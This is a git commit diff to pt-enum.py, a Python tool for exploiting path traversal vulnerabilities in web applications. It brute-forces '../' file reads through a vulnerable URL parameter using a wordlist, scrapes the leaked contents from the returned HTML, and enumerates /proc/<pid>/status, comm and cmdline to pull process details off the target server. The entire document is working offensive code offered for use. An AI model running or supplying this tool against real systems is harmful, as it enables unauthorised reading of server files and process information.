5ac5b21ad5856ba7c1ac1ab4009f12afb5453851
MidnightSeer <21272239+MidnightSeer@users.noreply.github.com>
2020-09-30 22:23:00 -0400

    Update pt-enum.py

--- pt-enum.py
+++ pt-enum.py
@@ -1,7 +1,10 @@
 #!/bin/python3
+#path traversal enumeration
 import requests
 import argparse
 import sys
+import re
+from bs4 import BeautifulSoup
 from os import system,name,path
 
 if name == "nt":
@@ -13,41 +16,112 @@ BOLD = '\033[1m'
 def get_request(item, host):
 	url=host+item
 	try:
+		print("[*] Trying",url)
 		r = requests.get(url=url)
-		if r.status_code == 200:
-			print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
-			print(r.text)
+		if r.status_code == 200 and r.text != "":
+			return r.text
 		else:
-			print(r)
+			pass
+			#print(r)
 	except Exception as e:
 		print("[-] Oops, Unable to Process the Get Request")
 		print(e)
 
-
+def parse(container, html):
+	if container is not None:
+		soup = BeautifulSoup(html,'lxml')
+		
+		if "," in container:
+			container_gp = container.split(",")
+			element = container_gp[0]
+			attr = container_gp[1].split("=")[0]
+			attr_value = container_gp[1].split("=")[1]
+			matches = soup.find(element,{attr:attr_value.strip('"')})
+			#print(element,attr,attr_value)
+			soup = BeautifulSoup(str(matches),'lxml')
+			print(soup.get_text(separator="\n"))
+		else:
+			element = container
+			matches = soup.find(element)
+			soup = BeautifulSoup(str(matches),'lxml')
+			print(soup.get_text(separator="\n"))
 
 def main():
 	parser = argparse.ArgumentParser(description="Get juicy info through path traversal vulnerabilities")
 	group1 = parser.add_mutually_exclusive_group(required=True)
 	parser.add_argument('--base-url',action='store', dest='host',type=str,help='Vulnerable host and path - http://<server>/path.php=',required=True)
-	parser.add_argument('--path',action='store', dest='path',type=str,help='Prefix path to prepend to all requests - ../../../',required=False,default=None)
+	parser.add_argument('--path',action='store',dest='path',type=str,help='Prefix path to prepend to all requests - ../../../',required=False,default='')
+	parser.add_argument('--container',action='store', dest='container',type=str,help='The html element that contains the results:  table,class="code" | table,id="code"',default=None,required=False)
+	parser.add_argument('--not-found-string',action='store', dest='not_found',type=str,help='A string to indicate failure or "None',required=False,default=None)
 	group1.add_argument('--list',action='store', dest='list',type=str,help='File with lists of file to bruteforce')
 	group1.add_argument('--file',action='store', dest='file',type=str,help='Single server file to try to access',default=None)
+	group1.add_argument('--enum-proc',action='store', dest='procs',type=str,help='<start proc#>,<end proc#> : 1,9000',required=False,default=None)
 	args = parser.parse_args()
+
+	if args.container is not None:
+		container = args.container.split(",")
 
 	if args.list is not None:
 		filename = args.list
 		if path.isfile(filename):
 			with open(filename,'r') as file_obj:
 				for line in file_obj:
-					if args.path is not None:
-						get_request(args.path+line.rstrip(),args.host)
-					else:
-						get_request(line.rstrip(),args.host)
+					try:
+						html = get_request(args.path+line.rstrip(),args.host)
+						if html:
+							url = args.host+args.path+line.rstrip()
+							if args.not_found is not None:
+								if args.not_found not in html:
+									print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
+									parse(args.container,html)
+							else:
+								print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
+								if args.container is not None:
+									parse(args.container,html)
+
+								else:
+									print(html)
+					except:
+						break
 		else:
 			print("[-] Unable to find file -->",filename)
 			sys.exit()
 
 	elif args.file is not None:
-		get_request(args.path+args.file,args.host)
+		html = get_request(args.path+args.file,args.host)
+		if html:
+			url = args.host+args.path+args.file.rstrip()
+			if args.not_found is not None:
+				if args.not_found not in html:
+					print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
+					parse(args.container,html)
+			else:
+				print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
+				if args.container is not None:
+					parse(args.container,html)
+
+				else:
+					print(html)
+
+
+	elif args.procs is not None:
+		start = int(args.procs.split(',')[0])
+		end = int(args.procs.split(',')[1])
+		for i in range(start,end+1):
+			uri = "{}/proc/{}/status".format(args.path,i)
+			text = get_request(uri,args.host)
+
+			if text:
+				attr_list = ["comm","cmdline"]
+				for attr in attr_list:
+					uri = "{}/proc/{}/{}".format(args.path,i,attr)
+					text = get_request(uri,args.host)
+					if text:	
+						url = args.host + uri
+						print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
+						print(text.rstrip())
+				print()
+				
+
 
 main()
